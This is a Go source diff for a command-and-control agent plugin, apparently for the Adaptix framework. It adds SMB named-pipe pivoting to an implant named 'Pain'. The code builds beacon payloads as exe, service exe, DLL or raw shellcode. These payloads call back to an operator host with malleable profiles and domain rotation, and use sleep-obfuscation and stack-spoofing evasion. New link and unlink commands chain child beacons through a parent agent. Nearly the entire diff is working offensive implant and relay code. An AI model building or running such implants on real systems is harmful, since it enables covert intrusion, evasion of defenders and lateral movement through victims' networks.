@@ -27,14 +27,32 @@ const (
 // key: 32-char lowercase hex string  →  value: int (AUTH_MODE_CMD or AUTH_MODE_OTK)
 var authKeys sync.Map
 
-// listenerConfig mirrors the listener plugin's ListenerConfig for JSON parsing.
-// Field names MUST match the json tags in listener_pain_http/src_server/pl_structs.go.
+// listenerConfig mirrors the HTTP listener plugin's ListenerConfig for JSON parsing.
 type listenerConfig struct {
 	HostBind       string `json:"host_bind"`
 	PortBind       int    `json:"port_bind"`
 	Ssl            bool   `json:"ssl"`
-	ProfileContent string `json:"uploaded_file"`            // base64 of the uploaded C2 profile JSON
-	DomainRotation string `json:"domain_rotation_strategy"` // "Random"|"Round Robin"|"Failover"
+	ProfileContent string `json:"uploaded_file"`
+	DomainRotation string `json:"domain_rotation_strategy"`
+}
+
+// smbListenerConfig mirrors the SMB listener plugin's ListenerConfig.
+type smbListenerConfig struct {
+	PipeName string `json:"pipe_name"`
+}
+
+// agentBuildProfile is the unified profile type returned by GenerateProfiles.
+// Type lets BuildPayload dispatch to the correct code path.
+type agentBuildProfile struct {
+	Type string `json:"type"` // "http" | "smb"
+	// HTTP fields
+	HostBind       string `json:"host_bind,omitempty"`
+	PortBind       int    `json:"port_bind,omitempty"`
+	Ssl            bool   `json:"ssl,omitempty"`
+	ProfileContent string `json:"uploaded_file,omitempty"`
+	DomainRotation string `json:"domain_rotation_strategy,omitempty"`
+	// SMB field
+	PipeName string `json:"pipe_name,omitempty"`
 }
 
 // PainData holds Pain-specific fields that don't fit in the ax.AgentData
@@ -98,9 +116,7 @@ func newAgentFunctions() ax.AgentFunctions {
 		ProcessData: func(agentData ax.AgentData, packedData []byte) error {
 			return processData(agentData, packedData)
 		},
-		PivotPackData: func(pivotId string, data []byte) (ax.TaskData, error) {
-			return ax.TaskData{}, fmt.Errorf("pivot not supported")
-		},
+		PivotPackData: pivotPackData,
 	}
 }
 
@@ -218,23 +234,38 @@ func (pa *PluginAgent) CreateAgent(beat []byte) (ax.AgentData, ax.AgentFunctions
 	return CreateAgent(beat)
 }
 
-// GenerateProfiles extracts host/port from each listener's saved JSON profile
-// and encodes them as JSON bytes that BuildPayload will parse.
+// GenerateProfiles converts each listener's saved JSON into a typed agentBuildProfile
+// that BuildPayload uses to dispatch the correct build path.
 func (pa *PluginAgent) GenerateProfiles(profile ax.BuildProfile) ([][]byte, error) {
 	var result [][]byte
 	for _, lp := range profile.ListenerProfiles {
-		var cfg listenerConfig
-		if err := json.Unmarshal(lp.Profile, &cfg); err != nil {
+		// Try HTTP listener profile first
+		var httpCfg listenerConfig
+		if err := json.Unmarshal(lp.Profile, &httpCfg); err == nil && httpCfg.HostBind != "" && httpCfg.PortBind != 0 {
+			b, _ := json.Marshal(agentBuildProfile{
+				Type:           "http",
+				HostBind:       httpCfg.HostBind,
+				PortBind:       httpCfg.PortBind,
+				Ssl:            httpCfg.Ssl,
+				ProfileContent: httpCfg.ProfileContent,
+				DomainRotation: httpCfg.DomainRotation,
+			})
+			result = append(result, b)
 			continue
 		}
-		if cfg.HostBind == "" || cfg.PortBind == 0 {
+		// Try SMB listener profile
+		var smbCfg smbListenerConfig
+		if err := json.Unmarshal(lp.Profile, &smbCfg); err == nil && smbCfg.PipeName != "" {
+			b, _ := json.Marshal(agentBuildProfile{
+				Type:     "smb",
+				PipeName: smbCfg.PipeName,
+			})
+			result = append(result, b)
 			continue
 		}
-		b, _ := json.Marshal(cfg)
-		result = append(result, b)
 	}
 	if len(result) == 0 {
-		return nil, fmt.Errorf("no valid PainHTTP listener profiles found - create a PainHTTP listener first")
+		return nil, fmt.Errorf("no valid listener profile found - create a PainHTTP or PainSMB listener first")
 	}
 	return result, nil
 }
@@ -243,12 +274,12 @@ func (pa *PluginAgent) GenerateProfiles(profile ax.BuildProfile) ([][]byte, erro
 // it in loader.exe, which is returned as the download payload.
 func (pa *PluginAgent) BuildPayload(profile ax.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
 	if len(agentProfiles) == 0 {
-		return nil, "", fmt.Errorf("no listener profile - add a PainHTTP listener first")
+		return nil, "", fmt.Errorf("no listener profile - add a PainHTTP or PainSMB listener first")
 	}
 
-	// 1. Parse which listener to call home to
-	var lp listenerConfig
-	if err := json.Unmarshal(agentProfiles[0], &lp); err != nil {
+	// 1. Parse the unified listener profile produced by GenerateProfiles
+	var ap agentBuildProfile
+	if err := json.Unmarshal(agentProfiles[0], &ap); err != nil {
 		return nil, "", fmt.Errorf("bad listener profile: %v", err)
 	}
 
@@ -256,10 +287,10 @@ func (pa *PluginAgent) BuildPayload(profile ax.BuildProfile, agentProfiles [][]b
 	var uiCfg struct {
 		Sleep      int    `json:"sleep"`
 		Jitter     int    `json:"jitter"`
-		SleepTech  string `json:"sleep_tech"`  // "Timer Spoof" | "Ekko Graft" | "Ekko"
-		StackSpoof *bool  `json:"stack_spoof"` // checkbox: nil = use default (true)
-		AuthMode   string `json:"auth_mode"`   // combo currentText()
-		Format     string `json:"format"`      // "Exe" | "Service Exe" | "DLL" | "Shellcode"
+		SleepTech  string `json:"sleep_tech"`
+		StackSpoof *bool  `json:"stack_spoof"`
+		AuthMode   string `json:"auth_mode"`
+		Format     string `json:"format"`
 	}
 	uiCfg.Sleep = 5
 	_ = json.Unmarshal([]byte(profile.AgentConfig), &uiCfg)
@@ -298,65 +329,87 @@ func (pa *PluginAgent) BuildPayload(profile ax.BuildProfile, agentProfiles [][]b
 		}
 	}
 
-	// 4. Compile agent shellcode with operator-supplied parameters.
-	// UUID is now generated at agent runtime - no PAIN_AGENT_UUID make variable.
-	// We still clean first so changing HOST/PORT/SLEEP flags force a full recompile.
-
-	// Build malleable profile blob for multi-callback / rotation support.
-	// Falls back to single-host legacy mode when no profile is uploaded.
-	malleableHex := "{0x00}"
-	callbackCount := 0
-	rotCode := 0
-
-	if lp.ProfileContent != "" {
-		profileBytes, decErr := base64.StdEncoding.DecodeString(lp.ProfileContent)
-		if decErr == nil {
-			blob, count, bErr := buildMalleableBytes(string(profileBytes), lp.DomainRotation, lp.Ssl)
-			if bErr == nil && count > 0 {
-				malleableHex = bytesToHexStr(blob)
-				callbackCount = count
-				rotCode = rotationCode(lp.DomainRotation)
-				fmt.Printf("[Pain] BuildPayload: malleable blob %d bytes, %d callbacks, rotation=%q\n",
-					len(blob), count, lp.DomainRotation)
-			} else if bErr != nil {
-				fmt.Printf("[Pain] BuildPayload: malleable build failed: %v - using legacy single host\n", bErr)
-			}
-		}
-	}
-
-	fmt.Printf("[Pain] BuildPayload: compiling %s:%d ssl=%v sleep=%ds jitter=%d%% callbacks=%d\n",
-		lp.HostBind, lp.PortBind, lp.Ssl, uiCfg.Sleep, uiCfg.Jitter, callbackCount)
-
-	sslFlag := 0
-	if lp.Ssl {
-		sslFlag = 1
-	}
-	sleepTech := 0 // default: Timer Spoof
+	sleepTech := 0
 	if uiCfg.SleepTech == "Ekko Graft" {
 		sleepTech = 1
 	} else if uiCfg.SleepTech == "Ekko" {
 		sleepTech = 2
 	}
 
-	// default on; only off when checkbox was explicitly unchecked
 	stackSpoof := 1
 	if uiCfg.StackSpoof != nil && !*uiCfg.StackSpoof {
 		stackSpoof = 0
 	}
 
-	makeArgs := []string{
-		fmt.Sprintf("PAIN_C2_HOST=%s", lp.HostBind),
-		fmt.Sprintf("PAIN_C2_PORT=%d", lp.PortBind),
+	// 4. Transport-specific make args
+	var makeArgs []string
+
+	switch ap.Type {
+	case "smb":
+		pipeName := ap.PipeName
+		if pipeName == "" {
+			pipeName = `\\.\pipe\pain`
+		}
+		fmt.Printf("[Pain] BuildPayload: compiling SMB agent pipe=%s sleep=%ds\n", pipeName, uiCfg.Sleep)
+		makeArgs = []string{
+			"PAIN_C2_HOST=127.0.0.1",
+			"PAIN_C2_PORT=8080",
+			"PAIN_C2_SSL=0",
+			"PAIN_PROFILE_C2=0x15",
+			fmt.Sprintf("PAIN_PIPE_NAME=\"%s\"", pipeNameToHexArr(pipeName)),
+			"PAIN_MALLEABLE_BYTES=\"{0x00}\"",
+			"PAIN_CALLBACK_COUNT=0",
+			"PAIN_ROTATION=0",
+		}
+
+	default: // "http"
+		malleableHex := "{0x00}"
+		callbackCount := 0
+		rotCode := 0
+
+		if ap.ProfileContent != "" {
+			profileBytes, decErr := base64.StdEncoding.DecodeString(ap.ProfileContent)
+			if decErr == nil {
+				blob, count, bErr := buildMalleableBytes(string(profileBytes), ap.DomainRotation, ap.Ssl)
+				if bErr == nil && count > 0 {
+					malleableHex = bytesToHexStr(blob)
+					callbackCount = count
+					rotCode = rotationCode(ap.DomainRotation)
+					fmt.Printf("[Pain] BuildPayload: malleable blob %d bytes, %d callbacks, rotation=%q\n",
+						len(blob), count, ap.DomainRotation)
+				} else if bErr != nil {
+					fmt.Printf("[Pain] BuildPayload: malleable build failed: %v - using legacy single host\n", bErr)
+				}
+			}
+		}
+
+		sslFlag := 0
+		if ap.Ssl {
+			sslFlag = 1
+		}
+
+		fmt.Printf("[Pain] BuildPayload: compiling %s:%d ssl=%v sleep=%ds jitter=%d%% callbacks=%d\n",
+			ap.HostBind, ap.PortBind, ap.Ssl, uiCfg.Sleep, uiCfg.Jitter, callbackCount)
+
+		makeArgs = []string{
+			fmt.Sprintf("PAIN_C2_HOST=%s", ap.HostBind),
+			fmt.Sprintf("PAIN_C2_PORT=%d", ap.PortBind),
+			fmt.Sprintf("PAIN_C2_SSL=%d", sslFlag),
+			"PAIN_PROFILE_C2=0x25",
+			fmt.Sprintf("PAIN_MALLEABLE_BYTES=\"%s\"", malleableHex),
+			fmt.Sprintf("PAIN_CALLBACK_COUNT=%d", callbackCount),
+			fmt.Sprintf("PAIN_ROTATION=%d", rotCode),
+		}
+	}
+
+	// Common args applied to every transport type
+	makeArgs = append(makeArgs,
 		fmt.Sprintf("PAIN_SLEEP=%d", uiCfg.Sleep),
 		fmt.Sprintf("PAIN_JITTER=%d", uiCfg.Jitter),
-		fmt.Sprintf("PAIN_C2_SSL=%d", sslFlag),
 		fmt.Sprintf("PAIN_AUTH_MODE=%d", authMode),
 		fmt.Sprintf("PAIN_SLEEP_TECH=%d", sleepTech),
 		fmt.Sprintf("PAIN_STACK_SPOOF=%d", stackSpoof),
-		fmt.Sprintf("PAIN_MALLEABLE_BYTES=\"%s\"", malleableHex),
-		fmt.Sprintf("PAIN_CALLBACK_COUNT=%d", callbackCount),
-		fmt.Sprintf("PAIN_ROTATION=%d", rotCode),
-	}
+	)
 	if authKeyHex != "" {
 		makeArgs = append(makeArgs, fmt.Sprintf("PAIN_AUTH_KEY=%s", authKeyHex))
 	}
@@ -386,7 +439,7 @@ func (pa *PluginAgent) BuildPayload(profile ax.BuildProfile, agentProfiles [][]b
 	// 7. Shellcode-only format: skip loader build, return raw bytes directly.
 	if strings.HasPrefix(uiCfg.Format, "Shellcode") {
 		fmt.Printf("[Pain] BuildPayload: done - shellcode %d bytes for %s:%d\n",
-			len(shellcode), lp.HostBind, lp.PortBind)
+			len(shellcode), ap.HostBind, ap.PortBind)
 		return shellcode, "pain.x64.bin", nil
 	}
 
@@ -418,7 +471,7 @@ func (pa *PluginAgent) BuildPayload(profile ax.BuildProfile, agentProfiles [][]b
 	}
 
 	fmt.Printf("[Pain] BuildPayload: done - %s %d bytes for %s:%d\n",
-		outName, len(loaderBytes), lp.HostBind, lp.PortBind)
+		outName, len(loaderBytes), ap.HostBind, ap.PortBind)
 
 	return loaderBytes, outName, nil
 }
@@ -439,6 +492,19 @@ func genShellcodeHeader(data []byte) []byte {
 	}
 	b.WriteString(fmt.Sprintf("\n    };\n    constexpr size_t Size = %d;\n}\n", len(data)))
 	return []byte(b.String())
+}
+
+// pipeNameToHexArr converts a Windows pipe path string into the C byte-array literal
+// that PAIN_PIPE_NAME expects, e.g. "\\.\pipe\pain" → "{0x5c,0x5c,0x2e,...,0x00}".
+// Same format as PAIN_MALLEABLE_BYTES - avoids all Makefile/shell backslash issues.
+func pipeNameToHexArr(name string) string {
+	var sb strings.Builder
+	sb.WriteByte('{')
+	for i := 0; i < len(name); i++ {
+		fmt.Fprintf(&sb, "0x%02x,", name[i])
+	}
+	sb.WriteString("0x00}")
+	return sb.String()
 }
 
 // CreateCommand builds a task packet when the operator runs a command in the UI
@@ -506,6 +572,42 @@ func CreateCommand(agentData ax.AgentData, args map[string]any) (ax.TaskData, ax
 		taskData.Data = buildTaskPacket(CMD_BOF, argPacker.Bytes())
 		messageData.Message = fmt.Sprintf("execute_bof: %s (%d bytes)", bofPath, len(bofBytes))
 
+	case "link":
+		subcommand, _ := args["subcommand"].(string)
+		if subcommand != "smb" {
+			return taskData, messageData, errors.New("usage: link smb <target> [pipe_name]")
+		}
+		target, ok := args["target"].(string)
+		if !ok || target == "" {
+			return taskData, messageData, errors.New("'target' is required for link smb")
+		}
+		pipeName, _ := args["pipe_name"].(string)
+		if pipeName == "" {
+			pipeName = "pain"
+		}
+		fullPath := fmt.Sprintf("\\\\%s\\pipe\\%s", target, pipeName)
+		argPacker.WriteStr(fullPath)
+		taskData.Data = buildTaskPacket(CMD_LINK, argPacker.Bytes())
+		messageData.Message = fmt.Sprintf("link smb: %s", fullPath)
+
+	case "unlink":
+		agentIDStr, ok := args["agent_id"].(string)
+		if !ok || agentIDStr == "" {
+			return taskData, messageData, errors.New("'agent_id' is required")
+		}
+		agentIdInt, err := strconv.ParseInt(agentIDStr, 10, 64)
+		if err != nil {
+			return taskData, messageData, fmt.Errorf("invalid agent_id %q: %v", agentIDStr, err)
+		}
+		uuidVal, found := PivotChildMap.Load(agentIdInt)
+		if !found {
+			return taskData, messageData, fmt.Errorf("agent %s is not a known SMB child", agentIDStr)
+		}
+		childUUID := uuidVal.(string)
+		argPacker.WriteStr(childUUID)
+		taskData.Data = buildTaskPacket(CMD_UNLINK, argPacker.Bytes())
+		messageData.Message = fmt.Sprintf("unlink: agent %s (%s)", agentIDStr, childUUID[:8])
+
 	default:
 		return taskData, messageData, fmt.Errorf("Unknown command: %s", command)
 	}
@@ -563,9 +665,20 @@ func buildTaskPacket(cmdId uint32, argData []byte) []byte {
 // PackTasks serialiese the taks list into the exact byte Task_Dispatch parses
 func PackTasks(agentData ax.AgentData, tasks []ax.TaskData) ([]byte, error) {
 	p := NewPacker()
-	p.WriteInt32(uint32(len(tasks)))
 
-	for _, task := range tasks {
+	// Filter out SMB heartbeat placeholders: PROXY_DATA tasks with no Data.
+	// They exist only to satisfy TsTasksPivotExists so extractPivotTasks runs;
+	// the child should receive [4B 0] (zero task count) which we produce here.
+	var real []ax.TaskData
+	for _, t := range tasks {
+		if t.Type == ax.TASK_TYPE_PROXY_DATA && len(t.Data) == 0 {
+			continue
+		}
+		real = append(real, t)
+	}
+
+	p.WriteInt32(uint32(len(real)))
+	for _, task := range real {
 		// UUID must be exactly 36 bytes - pad with zeros if shorter
 		idStr := fmt.Sprintf("%036d", task.TaskId) // zero-pad int64 to 36 decimal digits
 		p.WritePad([]byte(idStr))
@@ -573,6 +686,55 @@ func PackTasks(agentData ax.AgentData, tasks []ax.TaskData) ([]byte, error) {
 	}
 
 	return p.Bytes(), nil
+}
+
+// injectHeartbeat puts a PROXY_DATA placeholder into the child's hosted queue.
+// This makes TsTasksPivotExists return true for the HTTP parent, which causes
+// extractPivotTasks to run and build a CMD_PIVOT heartbeat relay. PackTasks
+// filters the placeholder out, so the child receives [4B 0] = zero tasks.
+func injectHeartbeat(childId int64) {
+	ModuleObject.ts.TsTaskCreate(childId, "smb_heartbeat", "smb", ax.TaskData{
+		Type:    ax.TASK_TYPE_PROXY_DATA,
+		AgentId: childId,
+		Sync:    false, // no DB insert, no UI sync
+	})
+}
+
+// cleanPivotMaps removes all pivot-tracking entries for a child.
+func cleanPivotMaps(childUUID string, childId int64) {
+	PivotMap.Delete(childUUID)
+	PivotParentMap.Delete(childUUID)
+	PivotChildMap.Delete(childId)
+}
+
+// notifyParentConsole prints a disconnect/unlink message in the HTTP parent's console.
+// Looks up the parent from PivotParentMap; no-ops if the agent has no parent (HTTP agents).
+func notifyParentConsole(agentId int64, childUUID string, reason string) {
+	parentVal, ok := PivotParentMap.Load(childUUID)
+	if !ok {
+		// Try reverse lookup: agentId might be the child itself.
+		if uuidVal, ok2 := PivotChildMap.Load(agentId); ok2 {
+			parentVal, ok = PivotParentMap.Load(uuidVal.(string))
+		}
+	}
+	if !ok {
+		return
+	}
+	parentId := parentVal.(int64)
+	msg := fmt.Sprintf("----- SMB child %s %s -----", childUUID[:8], reason)
+	ModuleObject.ts.TsAgentConsoleOutput(parentId, "pain", MESSAGE_INFO, msg, msg, false)
+}
+
+// notifyParentDisconnect is called when an agent's CMD_EXIT fires.
+// If the agent is an SMB child (tracked in PivotChildMap), it notifies its parent.
+func notifyParentDisconnect(agentId int64, taskId int64, reason string) {
+	uuidVal, ok := PivotChildMap.Load(agentId)
+	if !ok {
+		return // HTTP root agent - no parent to notify
+	}
+	childUUID := uuidVal.(string)
+	notifyParentConsole(agentId, childUUID, reason)
+	cleanPivotMaps(childUUID, agentId)
 }
 
 // ProcessData is called for every inbound packet that is NOT a check-in.
@@ -601,6 +763,83 @@ func processData(agentData ax.AgentData, packedData []byte) error {
 	var output string
 	if p.Remaining() >= 4 {
 		out := p.ReadBytes()
+		if len(out) > 0 && out[0] == LINK_MAGIC {
+			// CMD_LINK result: [0x4C][36B child UUID][checkin payload]
+			// Register the child agent with the SMB listener, then report to the operator.
+			childData := out[1:]
+			linkErr := registerSmbChild(agentData, taskId, childData)
+			if linkErr != nil {
+				ModuleObject.ts.TsTaskUpdate(agentData.Id, ax.TaskData{
+					Type:        TYPE_TASK,
+					AgentId:     agentData.Id,
+					TaskId:      taskId,
+					MessageType: MESSAGE_ERROR,
+					Completed:   true,
+					Sync:        true,
+					ClearText:   fmt.Sprintf("link failed: %v", linkErr),
+				})
+			}
+			return nil
+		}
+
+		// EXIT_MAGIC: agent sent 0x45 before TerminateProcess - mark it terminated.
+		if len(out) == 1 && out[0] == EXIT_MAGIC {
+			notifyParentDisconnect(agentData.Id, taskId, "exited")
+			_ = ModuleObject.ts.TsAgentTerminate(agentData.Id, taskId)
+			return nil
+		}
+
+		// CMD_UNLINK result: HTTP parent closed the child pipe, echoes back [36B child_uuid].
+		if len(out) == 36 {
+			childUUID := string(out[:36])
+			if val, ok := PivotMap.Load(childUUID); ok {
+				childId := val.(int64)
+				notifyParentConsole(agentData.Id, childUUID, "unlinked")
+				_ = ModuleObject.ts.TsAgentTerminate(childId, taskId)
+				cleanPivotMaps(childUUID, childId)
+			}
+			output = fmt.Sprintf("SMB child %s unlinked", string(out[:8]))
+		}
+
+		if len(out) == 37 && out[0] == PIVOT_DEAD_MAGIC {
+			// HTTP parent's pipe to the SMB child broke: [0x44][36B child_uuid]
+			childUUID := string(out[1:37])
+			if val, ok := PivotMap.Load(childUUID); ok {
+				childId := val.(int64)
+				fmt.Printf("[Pain] SMB child %s pipe broken - terminating agent %d\n", childUUID, childId)
+				notifyParentConsole(agentData.Id, childUUID, "lost connection")
+				if err := ModuleObject.ts.TsAgentTerminate(childId, 0); err != nil {
+					fmt.Printf("[Pain] TsAgentTerminate(%d): %v\n", childId, err)
+				}
+				cleanPivotMaps(childUUID, childId)
+			}
+			return nil
+		}
+
+		if len(out) >= 37 && out[0] == PIVOT_RESULT_MAGIC {
+			// CMD_PIVOT result: [0x50][36B child_uuid][encrypted_child_body]
+			// Route the encrypted body to the child agent's ProcessData so its
+			// task results get displayed in the child's session.
+			childUUID := string(out[1:37])
+			encBody := out[37:]
+
+			if val, ok := PivotMap.Load(childUUID); ok {
+				childId := val.(int64)
+
+				if err := ModuleObject.ts.TsAgentProcessData(childId, encBody); err != nil {
+					fmt.Printf("[Pain] pivot relay: TsAgentProcessData failed for %s: %v\n", childUUID, err)
+				}
+				_ = ModuleObject.ts.TsAgentSetTick(childId, SMB_LISTENER_NAME)
+
+				// Re-inject heartbeat to keep the relay cycle alive until the next
+				// operator command arrives for this child.
+				injectHeartbeat(childId)
+			} else {
+				fmt.Printf("[Pain] pivot relay: unknown child UUID %s\n", childUUID)
+			}
+			return nil
+		}
+
 		if out != nil {
 			output = string(out)
 		}
@@ -616,6 +855,71 @@ func processData(agentData ax.AgentData, packedData []byte) error {
 		Completed:   true,
 		Sync:        true,
 		ClearText:   output,
+	})
+
+	return nil
+}
+
+// registerSmbChild registers the child SMB beacon with the PainSMB listener.
+// childData = [36B child UUID][checkin payload] from the parent's CMD_LINK result.
+// On success it updates the parent's task with the child's UUID string.
+func registerSmbChild(parentData ax.AgentData, taskId int64, childData []byte) error {
+	if len(childData) < 36 {
+		return fmt.Errorf("child data too short (%d bytes)", len(childData))
+	}
+
+	uid     := childData[:36]
+	payload := childData[36:]
+
+	childId, exists := ModuleObject.ts.TsAgentIdByUID(uid)
+	if !exists {
+		// Register the SMB child with Async=false so LastTickWorker skips it
+		// entirely and never renders a countdown. The child only communicates
+		// through the parent relay, so a sleep-based countdown is meaningless.
+		agentInfo, err := ModuleObject.ts.TsAgentCreate(
+			"deadbeef", uid, payload, SMB_LISTENER_NAME, "SMB", false,
+		)
+		if err != nil {
+			// Race: check again in case another goroutine already created it
+			if retryId, found := ModuleObject.ts.TsAgentIdByUID(uid); found {
+				childId = retryId
+			} else {
+				return fmt.Errorf("TsAgentCreate: %w", err)
+			}
+		} else {
+			childId = agentInfo.Id
+		}
+	}
+
+	_ = ModuleObject.ts.TsAgentSetTick(childId, SMB_LISTENER_NAME)
+
+	// Store all pivot mappings so relay, death-detection, and unlink can all find each other.
+	childUUID := string(uid)
+	PivotMap.Store(childUUID, childId)
+	PivotParentMap.Store(childUUID, parentData.Id)
+	PivotChildMap.Store(childId, childUUID)
+
+	// Register the pivot relationship so Adaptix calls PivotPackData when the
+	// child has tasks, which causes the HTTP parent to relay them via CMD_PIVOT.
+	if err := ModuleObject.ts.TsPivotCreate(childUUID, parentData.Id, childId, "", false); err != nil {
+		fmt.Printf("[Pain] TsPivotCreate warning (non-fatal): %v\n", err)
+	}
+
+	// Seed the relay cycle: inject the first heartbeat so TsTasksPivotExists
+	// returns true on the parent's next HTTP poll, triggering extractPivotTasks.
+	injectHeartbeat(childId)
+
+	fmt.Printf("[Pain] linked SMB child %s via parent agent %d (child id=%d)\n",
+		string(uid), parentData.Id, childId)
+
+	ModuleObject.ts.TsTaskUpdate(parentData.Id, ax.TaskData{
+		Type:        TYPE_TASK,
+		AgentId:     parentData.Id,
+		TaskId:      taskId,
+		MessageType: MESSAGE_SUCCESS,
+		Completed:   true,
+		Sync:        true,
+		ClearText:   fmt.Sprintf("linked SMB child: %s", string(uid)),
 	})
 
 	return nil
